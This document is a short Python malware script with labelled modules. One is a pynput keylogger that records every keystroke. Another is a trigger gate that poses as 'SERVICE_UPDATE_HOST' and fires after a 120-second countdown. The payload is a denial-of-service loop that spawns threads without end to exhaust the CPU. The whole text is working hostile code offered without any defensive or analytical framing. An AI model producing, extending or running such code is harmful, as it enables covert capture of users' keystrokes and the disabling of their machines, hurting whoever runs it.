import os
import sys
import time
import threading
import datetime
from pynput import keyboard

# --- CONFIGURATION ---
# Zero Hour: 120 seconds from execution
TARGET_EPOCH = time.time() + 120 

# --- MODULE 1: SURVEILLANCE (Keylogger) ---
class Surveillance:
    def __init__(self):
        self.buffer = ""
        self.max_buffer = 512

    def on_press(self, key):
        try:
            self.buffer += str(key.char)
        except AttributeError:
            self.buffer += f" [{str(key)}] "
        
        if len(self.buffer) > self.max_buffer:
            self.buffer = self.buffer[-self.max_buffer:]

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# --- MODULE 2: THE PAYLOAD (DoS) ---
def execute_denial_of_service():
    print("[!] ZERO HOUR REACHED. INITIATING BLACKOUT...")
    print("[*] PERSISTENCE MODE: ON. EVIDENCE PRESERVED.")
    
    # Resource Exhaustion Loop
    while True:
        try:
            # Flood CPU cycles
            threading.Thread(target=lambda: [os.urandom(1024) for _ in range(10000)]).start()
        except:
            pass

# --- MODULE 3: MONITOR (Trigger Gate) ---
def monitor_logic():
    print(f"[*] SERVICE_UPDATE_HOST: STATUS RUNNING...")
    print(f"[*] TARGET LOCK: {datetime.datetime.fromtimestamp(TARGET_EPOCH)}")
    
    while True:
        current_time = time.time()
        if current_time >= TARGET_EPOCH:
            execute_denial_of_service()
            break
        time.sleep(1)

# --- MAIN ---
if __name__ == "__main__":
    # Start Keylogger
    spy = Surveillance()
    threading.Thread(target=spy.start, daemon=True).start()

    # Start Countdown
    monitor_logic()
